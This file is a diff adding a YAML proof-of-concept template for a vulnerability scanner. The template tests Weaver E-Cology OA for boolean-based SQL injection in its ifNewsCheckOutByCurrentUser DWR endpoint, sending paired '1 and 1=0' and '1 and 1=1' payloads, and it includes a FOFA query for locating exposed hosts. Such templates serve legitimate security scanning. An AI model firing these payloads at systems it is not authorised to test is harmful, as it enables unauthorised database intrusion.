@@ -1,0 +1,28 @@
+id: poc-yaml-ecology-ifnewscheckoutbycurrentuser-dwr-sqli
+info:
+  name: 泛微 E-Cology ifnewscheckoutbycurrentuser.dwr SQL 注入
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: e-cology
+  fofa: app="泛微-协同办公OA"
+requests:
+- method: POST
+  path: /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr
+  headers:
+    Content-Type: text/plain
+  data: callCount=1&page=&httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&c0-param0=string:1
+    and 1=0&c0-param1=string:1&batchId=0
+  expression: "status_code == 200 && \ncontains(body,\"dwr.engine._remoteHandleCallback('0','0',false);\"\
+    )\n"
+- method: POST
+  path: /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr
+  headers:
+    Content-Type: text/plain
+  data: callCount=1&page=&httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&c0-param0=string:1
+    and 1=1&c0-param1=string:1&batchId=0
+  expression: "status_code == 200 && \ncontains(body,\"dwr.engine._remoteHandleCallback('0','0',true);\"\
+    )\n"
+variables: {}
+transport: http
